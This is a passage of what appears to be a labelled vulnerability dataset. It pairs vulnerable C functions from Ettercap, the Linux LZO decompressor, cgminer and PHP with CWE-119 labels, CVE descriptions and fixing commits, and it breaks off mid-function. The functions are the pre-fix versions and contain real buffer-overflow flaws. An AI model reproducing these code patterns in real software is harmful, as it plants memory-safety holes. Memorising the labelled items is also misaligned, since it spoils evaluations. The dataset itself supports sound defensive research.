DEBUG_MSG(\"\\tDissector_postgresql RESPONSE type is MD5\");\n               if(memcmp(ptr + 1, \"\\x00\\x00\\x00\\x28\", 4)) {\n                  DEBUG_MSG(\"\\tDissector_postgresql BUG, expected length is 40\");\n                  return NULL;\n               }\n               if (PACKET->DATA.len < 40) {\n                  DEBUG_MSG(\"\\tDissector_postgresql BUG, expected length is 40\");\n                  return NULL;\n               }\n               memcpy(conn_status->hash, ptr + 5 + 3, 32);\n               conn_status->hash[32] = 0;\n               DISSECT_MSG(\"%s:$postgres$%s*%s*%s:%s:%d\\n\", conn_status->user, conn_status->user, conn_status->salt, conn_status->hash, ip_addr_ntoa(&PACKET->L3.dst, tmp), ntohs(PACKET->L4.dst));\n               dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n            }\n            else if (ptr[0] == 'p' && conn_status->type == CT) {\n                int length;\n                DEBUG_MSG(\"\\tDissector_postgresql RESPONSE type is clear-text!\");\n                GET_ULONG_BE(length, ptr, 1);\n               strncpy((char*)conn_status->password, (char*)(ptr + 5), length - 4);\n               conn_status->password[length - 4] = 0;\n                DISSECT_MSG(\"PostgreSQL credentials:%s-%d:%s:%s\\n\", ip_addr_ntoa(&PACKET->L3.dst, tmp), ntohs(PACKET->L4.dst), conn_status->user, conn_status->password);\n                dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n             }\n         }\n      }\n   } else { /* Packets coming from the server */\n      if (PACKET->DATA.len < 9)\n         return NULL;\n      dissect_create_ident(&ident, PACKET, DISSECT_CODE(dissector_postgresql));\n\n      if (session_get(&s, ident, DISSECT_IDENT_LEN) == ESUCCESS) {\n         conn_status = (struct postgresql_status *) s->data;\n         if (conn_status->status == WAIT_AUTH &&\n               ptr[0] == 'R' && !memcmp(ptr + 1, \"\\x00\\x00\\x00\\x0c\", 4)  &&\n               !memcmp(ptr + 5, \"\\x00\\x00\\x00\\x05\", 4)) {\n\n            conn_status->status = WAIT_RESPONSE;\n\n            conn_status->type = MD5;\n            DEBUG_MSG(\"\\tDissector_postgresql AUTH type is MD5\");\n            hex_encode(ptr + 9, 4, conn_status->salt); /* save salt */\n         }\n         else if (conn_status->status == WAIT_AUTH &&\n               ptr[0] == 'R' && !memcmp(ptr + 1, \"\\x00\\x00\\x00\\x08\", 4)  &&\n               !memcmp(ptr + 5, \"\\x00\\x00\\x00\\x03\", 4)) {\n            conn_status->status = WAIT_RESPONSE;\n            conn_status->type = CT;\n            DEBUG_MSG(\"\\tDissector_postgresql AUTH type is clear-text!\");\n         }\n      }\n   }\n\n   SAFE_FREE(ident);\n   return NULL;\n}\n", "func_hash": 113723108844572007792416732313477179140, "file_name": "ec_postgresql.c", "file_hash": 75203240410363383935232600633355556579, "cwe": ["CWE-119"], "cve": "CVE-2014-6395", "cve_desc": "Heap-based buffer overflow in the dissector_postgresql function in dissectors/ec_postgresql.c in Ettercap before 0.8.1 allows remote attackers to cause a denial of service or possibly execute arbitrary code via a crafted password length value that is inconsistent with the actual length of the password.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6395"}
{"idx": 1234, "project": "linux", "commit_id": "206a81c18401c0cde6e579164f752c4b147324ce", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/206a81c18401c0cde6e579164f752c4b147324ce", "commit_message": "lzo: properly check for overruns\n\nThe lzo decompressor can, if given some really crazy data, possibly\noverrun some variable types.  Modify the checking logic to properly\ndetect overruns before they happen.\n\nReported-by: \"Don A. Bailey\" <donb@securitymouse.com>\nTested-by: \"Don A. Bailey\" <donb@securitymouse.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 1, "func": " int lzo1x_decompress_safe(const unsigned char *in, size_t in_len,\n \t\t\t  unsigned char *out, size_t *out_len)\n{\n\tunsigned char *op;\n\tconst unsigned char *ip;\n\tsize_t t, next;\n\tsize_t state = 0;\n\tconst unsigned char *m_pos;\n\tconst unsigned char * const ip_end = in + in_len;\n\tunsigned char * const op_end = out + *out_len;\n\n\top = out;\n\tip = in;\n\n\tif (unlikely(in_len < 3))\n\t\tgoto input_overrun;\n\tif (*ip > 17) {\n\t\tt = *ip++ - 17;\n\t\tif (t < 4) {\n\t\t\tnext = t;\n\t\t\tgoto match_next;\n\t\t}\n\t\tgoto copy_literal_run;\n\t}\n\n\tfor (;;) {\n\t\tt = *ip++;\n\t\tif (t < 16) {\n\t\t\tif (likely(state == 0)) {\n\t\t\t\tif (unlikely(t == 0)) {\n \t\t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\t\tt += 255;\n \t\t\t\t\t\tip++;\n\t\t\t\t\t\tNEED_IP(1);\n \t\t\t\t\t}\n \t\t\t\t\tt += 15 + *ip++;\n \t\t\t\t}\n \t\t\t\tt += 3;\n copy_literal_run:\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n\t\t\t\tif (likely(HAVE_IP(t + 15) && HAVE_OP(t + 15))) {\n \t\t\t\t\tconst unsigned char *ie = ip + t;\n \t\t\t\t\tunsigned char *oe = op + t;\n \t\t\t\t\tdo {\n\t\t\t\t\t\tCOPY8(op, ip);\n\t\t\t\t\t\top += 8;\n\t\t\t\t\t\tip += 8;\n\t\t\t\t\t\tCOPY8(op, ip);\n\t\t\t\t\t\top += 8;\n\t\t\t\t\t\tip += 8;\n\t\t\t\t\t} while (ip < ie);\n\t\t\t\t\tip = ie;\n\t\t\t\t\top = oe;\n \t\t\t\t} else\n #endif\n \t\t\t\t{\n\t\t\t\t\tNEED_OP(t);\n\t\t\t\t\tNEED_IP(t + 3);\n \t\t\t\t\tdo {\n \t\t\t\t\t\t*op++ = *ip++;\n \t\t\t\t\t} while (--t > 0);\n\t\t\t\t}\n\t\t\t\tstate = 4;\n\t\t\t\tcontinue;\n\t\t\t} else if (state != 4) {\n\t\t\t\tnext = t & 3;\n\t\t\t\tm_pos = op - 1;\n \t\t\t\tm_pos -= t >> 2;\n \t\t\t\tm_pos -= *ip++ << 2;\n \t\t\t\tTEST_LB(m_pos);\n\t\t\t\tNEED_OP(2);\n \t\t\t\top[0] = m_pos[0];\n \t\t\t\top[1] = m_pos[1];\n \t\t\t\top += 2;\n\t\t\t\tgoto match_next;\n\t\t\t} else {\n\t\t\t\tnext = t & 3;\n\t\t\t\tm_pos = op - (1 + M2_MAX_OFFSET);\n\t\t\t\tm_pos -= t >> 2;\n\t\t\t\tm_pos -= *ip++ << 2;\n\t\t\t\tt = 3;\n\t\t\t}\n\t\t} else if (t >= 64) {\n\t\t\tnext = t & 3;\n\t\t\tm_pos = op - 1;\n\t\t\tm_pos -= (t >> 2) & 7;\n\t\t\tm_pos -= *ip++ << 3;\n\t\t\tt = (t >> 5) - 1 + (3 - 1);\n\t\t} else if (t >= 32) {\n\t\t\tt = (t & 31) + (3 - 1);\n\t\t\tif (unlikely(t == 2)) {\n \t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\tt += 255;\n \t\t\t\t\tip++;\n\t\t\t\t\tNEED_IP(1);\n \t\t\t\t}\n \t\t\t\tt += 31 + *ip++;\n\t\t\t\tNEED_IP(2);\n \t\t\t}\n \t\t\tm_pos = op - 1;\n \t\t\tnext = get_unaligned_le16(ip);\n\t\t\tip += 2;\n\t\t\tm_pos -= next >> 2;\n\t\t\tnext &= 3;\n\t\t} else {\n\t\t\tm_pos = op;\n\t\t\tm_pos -= (t & 8) << 11;\n\t\t\tt = (t & 7) + (3 - 1);\n\t\t\tif (unlikely(t == 2)) {\n \t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\tt += 255;\n \t\t\t\t\tip++;\n\t\t\t\t\tNEED_IP(1);\n \t\t\t\t}\n \t\t\t\tt += 7 + *ip++;\n\t\t\t\tNEED_IP(2);\n \t\t\t}\n \t\t\tnext = get_unaligned_le16(ip);\n \t\t\tip += 2;\n\t\t\tm_pos -= next >> 2;\n\t\t\tnext &= 3;\n\t\t\tif (m_pos == op)\n\t\t\t\tgoto eof_found;\n\t\t\tm_pos -= 0x4000;\n\t\t}\n\t\tTEST_LB(m_pos);\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n \t\tif (op - m_pos >= 8) {\n \t\t\tunsigned char *oe = op + t;\n\t\t\tif (likely(HAVE_OP(t + 15))) {\n \t\t\t\tdo {\n \t\t\t\t\tCOPY8(op, m_pos);\n \t\t\t\t\top += 8;\n\t\t\t\t\tm_pos += 8;\n\t\t\t\t\tCOPY8(op, m_pos);\n\t\t\t\t\top += 8;\n \t\t\t\t\tm_pos += 8;\n \t\t\t\t} while (op < oe);\n \t\t\t\top = oe;\n\t\t\t\tif (HAVE_IP(6)) {\n \t\t\t\t\tstate = next;\n \t\t\t\t\tCOPY4(op, ip);\n \t\t\t\t\top += next;\n \t\t\t\t\tip += next;\n \t\t\t\t\tcontinue;\n \t\t\t\t}\n \t\t\t} else {\n\t\t\t\tNEED_OP(t);\n \t\t\t\tdo {\n \t\t\t\t\t*op++ = *m_pos++;\n \t\t\t\t} while (op < oe);\n\t\t\t}\n\t\t} else\n #endif\n \t\t{\n \t\t\tunsigned char *oe = op + t;\n\t\t\tNEED_OP(t);\n \t\t\top[0] = m_pos[0];\n \t\t\top[1] = m_pos[1];\n \t\t\top += 2;\n\t\t\tm_pos += 2;\n\t\t\tdo {\n\t\t\t\t*op++ = *m_pos++;\n\t\t\t} while (op < oe);\n\t\t}\nmatch_next:\n \t\tstate = next;\n \t\tt = next;\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n\t\tif (likely(HAVE_IP(6) && HAVE_OP(4))) {\n \t\t\tCOPY4(op, ip);\n \t\t\top += t;\n \t\t\tip += t;\n \t\t} else\n #endif\n \t\t{\n\t\t\tNEED_IP(t + 3);\n\t\t\tNEED_OP(t);\n \t\t\twhile (t > 0) {\n \t\t\t\t*op++ = *ip++;\n \t\t\t\tt--;\n\t\t\t}\n\t\t}\n\t}\n\neof_found:\n\t*out_len = op - out;\n\treturn (t != 3       ? LZO_E_ERROR :\n\t\tip == ip_end ? LZO_E_OK :\n\t\tip <  ip_end ? LZO_E_INPUT_NOT_CONSUMED : LZO_E_INPUT_OVERRUN);\n\ninput_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_INPUT_OVERRUN;\n\noutput_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_OUTPUT_OVERRUN;\n\nlookbehind_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_LOOKBEHIND_OVERRUN;\n}\n", "func_hash": 274406254790435141604534304938072258803, "file_name": "lzo1x_decompress_safe.c", "file_hash": 59242432641946222716090607137357863371, "cwe": ["CWE-119"], "cve": "CVE-2014-4608", "cve_desc": "Multiple integer overflows in the lzo1x_decompress_safe function in lib/lzo/lzo1x_decompress_safe.c in the LZO decompressor in the Linux kernel before 3.15.2 allow context-dependent attackers to cause a denial of service (memory corruption) via a crafted Literal Run.  NOTE: the author of the LZO algorithms says \"the Linux kernel is *not* affected; media hype.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4608"}
{"idx": 1236, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 1, "func": "bool extract_sockaddr(char *url, char **sockaddr_url, char **sockaddr_port)\n{\n\tchar *url_begin, *url_end, *ipv6_begin, *ipv6_end, *port_start = NULL;\n\tchar url_address[256], port[6];\n\tint url_len, port_len = 0;\n\n\t*sockaddr_url = url;\n\turl_begin = strstr(url, \"//\");\n\tif (!url_begin)\n\t\turl_begin = url;\n\telse\n\t\turl_begin += 2;\n\n\t/* Look for numeric ipv6 entries */\n\tipv6_begin = strstr(url_begin, \"[\");\n\tipv6_end = strstr(url_begin, \"]\");\n\tif (ipv6_begin && ipv6_end && ipv6_end > ipv6_begin)\n\t\turl_end = strstr(ipv6_end, \":\");\n\telse\n\t\turl_end = strstr(url_begin, \":\");\n\tif (url_end) {\n\t\turl_len = url_end - url_begin;\n\t\tport_len = strlen(url_begin) - url_len - 1;\n\t\tif (port_len < 1)\n\t\t\treturn false;\n\t\tport_start = url_end + 1;\n\t} else\n\t\turl_len = strlen(url_begin);\n\n \tif (url_len < 1)\n \t\treturn false;\n \n\tsprintf(url_address, \"%.*s\", url_len, url_begin);\n \n \tif (port_len) {\n \t\tchar *slash;\n\n\t\tsnprintf(port, 6, \"%.*s\", port_len, port_start);\n\t\tslash = strchr(port, '/');\n\t\tif (slash)\n\t\t\t*slash = '\\0';\n\t} else\n\t\tstrcpy(port, \"80\");\n\n\t*sockaddr_port = strdup(port);\n\t*sockaddr_url = strdup(url_address);\n\n\treturn true;\n}\n", "func_hash": 268425937881460227077617707628391335121, "file_name": "util.c", "file_hash": 312757577260077548189069559014533960677, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 1237, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 1, "func": "static bool parse_notify(struct pool *pool, json_t *val)\n{\n\tchar *job_id, *prev_hash, *coinbase1, *coinbase2, *bbversion, *nbit,\n\t     *ntime, header[228];\n\tunsigned char *cb1 = NULL, *cb2 = NULL;\n\tsize_t cb1_len, cb2_len, alloc_len;\n\tbool clean, ret = false;\n\tint merkles, i;\n\tjson_t *arr;\n\n\tarr = json_array_get(val, 4);\n\tif (!arr || !json_is_array(arr))\n\t\tgoto out;\n\n\tmerkles = json_array_size(arr);\n\n\tjob_id = json_array_string(val, 0);\n\tprev_hash = __json_array_string(val, 1);\n\tcoinbase1 = json_array_string(val, 2);\n\tcoinbase2 = json_array_string(val, 3);\n\tbbversion = __json_array_string(val, 5);\n\tnbit = __json_array_string(val, 6);\n \tntime = __json_array_string(val, 7);\n \tclean = json_is_true(json_array_get(val, 8));\n \n\tif (!job_id || !prev_hash || !coinbase1 || !coinbase2 || !bbversion || !nbit || !ntime) {\n \t\t/* Annoying but we must not leak memory */\n\t\tif (job_id)\n\t\t\tfree(job_id);\n\t\tif (coinbase1)\n\t\t\tfree(coinbase1);\n\t\tif (coinbase2)\n\t\t\tfree(coinbase2);\n \t\tgoto out;\n \t}\n \n\tcg_wlock(&pool->data_lock);\n\tfree(pool->swork.job_id);\n\tpool->swork.job_id = job_id;\n\tsnprintf(pool->prev_hash, 65, \"%s\", prev_hash);\n\tcb1_len = strlen(coinbase1) / 2;\n\tcb2_len = strlen(coinbase2) / 2;\n\tsnprintf(pool->bbversion, 9, \"%s\", bbversion);\n\tsnprintf(pool->nbit, 9, \"%s\", nbit);\n\tsnprintf(pool->ntime, 9, \"%s\", ntime);\n\tpool->swork.clean = clean;\n\talloc_len = pool->coinbase_len = cb1_len + pool->n1_len + pool->n2size + cb2_len;\n\tpool->nonce2_offset = cb1_len + pool->n1_len;\n\n\tfor (i = 0; i < pool->merkles; i++)\n\t\tfree(pool->swork.merkle_bin[i]);\n\tif (merkles) {\n\t\tpool->swork.merkle_bin = realloc(pool->swork.merkle_bin,\n\t\t\t\t\t\t sizeof(char *) * merkles + 1);\n\t\tfor (i = 0; i < merkles; i++) {\n\t\t\tchar *merkle = json_array_string(arr, i);\n\n\t\t\tpool->swork.merkle_bin[i] = malloc(32);\n\t\t\tif (unlikely(!pool->swork.merkle_bin[i]))\n\t\t\t\tquit(1, \"Failed to malloc pool swork merkle_bin\");\n\t\t\tif (opt_protocol)\n\t\t\t\tapplog(LOG_DEBUG, \"merkle %d: %s\", i, merkle);\n\t\t\tret = hex2bin(pool->swork.merkle_bin[i], merkle, 32);\n\t\t\tfree(merkle);\n\t\t\tif (unlikely(!ret)) {\n\t\t\t\tapplog(LOG_ERR, \"Failed to convert merkle to merkle_bin in parse_notify\");\n\t\t\t\tgoto out_unlock;\n\t\t\t}\n\t\t}\n\t}\n\tpool->merkles = merkles;\n\tif (clean)\n\t\tpool->nonce2 = 0;\n#if 0\n\theader_len = \t\t strlen(pool->bbversion) +\n\t\t\t\t strlen(pool->prev_hash);\n\t/* merkle_hash */\t 32 +\n\t\t\t\t strlen(pool->ntime) +\n\t\t\t\t strlen(pool->nbit) +\n\t/* nonce */\t\t 8 +\n\t/* workpadding */\t 96;\n#endif\n\tsnprintf(header, 225,\n\t\t\"%s%s%s%s%s%s%s\",\n\t\tpool->bbversion,\n\t\tpool->prev_hash,\n\t\tblank_merkle,\n\t\tpool->ntime,\n\t\tpool->nbit,\n\t\t\"00000000\", /* nonce */\n\t\tworkpadding);\n\tret = hex2bin(pool->header_bin, header, 112);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert header to header_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\n\tcb1 = alloca(cb1_len);\n\tret = hex2bin(cb1, coinbase1, cb1_len);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert cb1 to cb1_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\tcb2 = alloca(cb2_len);\n\tret = hex2bin(cb2, coinbase2, cb2_len);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert cb2 to cb2_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\tfree(pool->coinbase);\n\talign_len(&alloc_len);\n\tpool->coinbase = calloc(alloc_len, 1);\n\tif (unlikely(!pool->coinbase))\n\t\tquit(1, \"Failed to calloc pool coinbase in parse_notify\");\n\tmemcpy(pool->coinbase, cb1, cb1_len);\n\tmemcpy(pool->coinbase + cb1_len, pool->nonce1bin, pool->n1_len);\n\tmemcpy(pool->coinbase + cb1_len + pool->n1_len + pool->n2size, cb2, cb2_len);\n\tif (opt_debug) {\n\t\tchar *cb = bin2hex(pool->coinbase, pool->coinbase_len);\n\n\t\tapplog(LOG_DEBUG, \"Pool %d coinbase %s\", pool->pool_no, cb);\n\t\tfree(cb);\n\t}\nout_unlock:\n\tcg_wunlock(&pool->data_lock);\n\n\tif (opt_protocol) {\n\t\tapplog(LOG_DEBUG, \"job_id: %s\", job_id);\n\t\tapplog(LOG_DEBUG, \"prev_hash: %s\", prev_hash);\n\t\tapplog(LOG_DEBUG, \"coinbase1: %s\", coinbase1);\n\t\tapplog(LOG_DEBUG, \"coinbase2: %s\", coinbase2);\n\t\tapplog(LOG_DEBUG, \"bbversion: %s\", bbversion);\n\t\tapplog(LOG_DEBUG, \"nbit: %s\", nbit);\n\t\tapplog(LOG_DEBUG, \"ntime: %s\", ntime);\n\t\tapplog(LOG_DEBUG, \"clean: %s\", clean ? \"yes\" : \"no\");\n\t}\n\tfree(coinbase1);\n\tfree(coinbase2);\n\n\t/* A notify message is the closest stratum gets to a getwork */\n\tpool->getwork_requested++;\n\ttotal_getworks++;\n\tif (pool == current_pool())\n\t\topt_work_update = true;\nout:\n\treturn ret;\n}\n", "func_hash": 84334959585750243556126605758413185403, "file_name": "util.c", "file_hash": 206367765513721418997031203388162533294, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 1238, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 1, "func": "static bool parse_reconnect(struct pool *pool, json_t *val)\n{\n\tchar *sockaddr_url, *stratum_port, *tmp;\n\tchar *url, *port, address[256];\n\n\tmemset(address, 0, 255);\n\turl = (char *)json_string_value(json_array_get(val, 0));\n\tif (!url)\n\t\turl = pool->sockaddr_url;\n\telse {\n\t\tchar *dot_pool, *dot_reconnect;\n\t\tdot_pool = strchr(pool->sockaddr_url, '.');\n\t\tif (!dot_pool) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request for pool without domain '%s'\",\n\t\t\t       pool->sockaddr_url);\n\t\t\treturn false;\n\t\t}\n\t\tdot_reconnect = strchr(url, '.');\n\t\tif (!dot_reconnect) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request to url without domain '%s'\",\n\t\t\t       url);\n\t\t\treturn false;\n\t\t}\n\t\tif (strcmp(dot_pool, dot_reconnect)) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request to non-matching domain url '%s'\",\n\t\t\t\tpool->sockaddr_url);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tport = (char *)json_string_value(json_array_get(val, 1));\n \tif (!port)\n \t\tport = pool->stratum_port;\n \n\tsprintf(address, \"%s:%s\", url, port);\n \n \tif (!extract_sockaddr(address, &sockaddr_url, &stratum_port))\n \t\treturn false;\n\n\tapplog(LOG_WARNING, \"Stratum reconnect requested from pool %d to %s\", pool->pool_no, address);\n\n\tclear_pool_work(pool);\n\n\tmutex_lock(&pool->stratum_lock);\n\t__suspend_stratum(pool);\n\ttmp = pool->sockaddr_url;\n\tpool->sockaddr_url = sockaddr_url;\n\tpool->stratum_url = pool->sockaddr_url;\n\tfree(tmp);\n\ttmp = pool->stratum_port;\n\tpool->stratum_port = stratum_port;\n\tfree(tmp);\n\tmutex_unlock(&pool->stratum_lock);\n\n\tif (!restart_stratum(pool)) {\n\t\tpool_failed(pool);\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n", "func_hash": 137361347459447412875947908752625113506, "file_name": "util.c", "file_hash": 206367765513721418997031203388162533294, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 1242, "project": "php-src", "commit_id": "b34d7849ed90ced9345f8ea1c59bc8d101c18468", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/b34d7849ed90ced9345f8ea1c59bc8d101c18468", "commit_message": "Merge branch 'PHP-5.6'\n\n* PHP-5.6:\n  Fix potential segfault in dns_get_record()", "target": 1, "func": "static u_char *php_parserr(u_char *cp, querybuf *answer, int type_to_fetch, int store, int raw, zval **subarray)\n{\n\tu_short type, class, dlen;\n\tu_long ttl;\n\tlong n, i;\n\tu_short s;\n\tu_char *tp, *p;\n\tchar name[MAXHOSTNAMELEN];\n\tint have_v6_break = 0, in_v6_break = 0;\n\n\t*subarray = NULL;\n\n\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, sizeof(name) - 2);\n\tif (n < 0) {\n\t\treturn NULL;\n\t}\n\tcp += n;\n\n\tGETSHORT(type, cp);\n\tGETSHORT(class, cp);\n\tGETLONG(ttl, cp);\n\tGETSHORT(dlen, cp);\n\tif (type_to_fetch != T_ANY && type != type_to_fetch) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tif (!store) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tALLOC_INIT_ZVAL(*subarray);\n\tarray_init(*subarray);\n\n\tadd_assoc_string(*subarray, \"host\", name, 1);\n\tadd_assoc_string(*subarray, \"class\", \"IN\", 1);\n\tadd_assoc_long(*subarray, \"ttl\", ttl);\n\n\tif (raw) {\n\t\tadd_assoc_long(*subarray, \"type\", type);\n\t\tadd_assoc_stringl(*subarray, \"data\", (char*) cp, (uint) dlen, 1);\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tswitch (type) {\n\t\tcase DNS_T_A:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"A\", 1);\n\t\t\tsnprintf(name, sizeof(name), \"%d.%d.%d.%d\", cp[0], cp[1], cp[2], cp[3]);\n\t\t\tadd_assoc_string(*subarray, \"ip\", name, 1);\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t\tcase DNS_T_MX:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"MX\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\t/* no break; */\n\t\tcase DNS_T_CNAME:\n\t\t\tif (type == DNS_T_CNAME) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"CNAME\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_NS:\n\t\t\tif (type == DNS_T_NS) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"NS\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_PTR:\n\t\t\tif (type == DNS_T_PTR) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"PTR\", 1);\n\t\t\t}\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_HINFO:\n\t\t\t/* See RFC 1010 for values */\n\t\t\tadd_assoc_string(*subarray, \"type\", \"HINFO\", 1);\n\t\t\tn = *cp & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_stringl(*subarray, \"cpu\", (char*)cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = *cp & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_stringl(*subarray, \"os\", (char*)cp, n, 1);\n\t\t\tcp += n;\n\t\t\tbreak;\n\t\tcase DNS_T_TXT:\n\t\t\t{\n\t\t\t\tint ll = 0;\n\t\t\t\tzval *entries = NULL;\n\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"TXT\", 1);\n\t\t\t\ttp = emalloc(dlen + 1);\n\t\t\t\t\n\t\t\t\tMAKE_STD_ZVAL(entries);\n\t\t\t\tarray_init(entries);\n \t\t\t\t\n \t\t\t\twhile (ll < dlen) {\n \t\t\t\t\tn = cp[ll];\n \t\t\t\t\tmemcpy(tp + ll , cp + ll + 1, n);\n \t\t\t\t\tadd_next_index_stringl(entries, cp + ll + 1, n, 1);\n \t\t\t\t\tll = ll + n + 1;\n\t\t\t\t}\n\t\t\t\ttp[dlen] = '\\0';\n\t\t\t\tcp += dlen;\n\n\t\t\t\tadd_assoc_stringl(*subarray, \"txt\", tp, (dlen>0)?dlen - 1:0, 0);\n\t\t\t\tadd_assoc_zval(*subarray, \"entries\", entries);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase DNS_T_SOA:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"SOA\", 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"mname\", name, 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"rname\", name, 1);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"serial\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"refresh\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"retry\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"expire\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"minimum-ttl\", n);\n\t\t\tbreak;\n\t\tcase DNS_T_AAAA:\n\t\t\ttp = (u_char*)name;\n\t\t\tfor(i=0; i < 8; i++) {\n\t\t\t\tGETSHORT(s, cp);\n\t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif 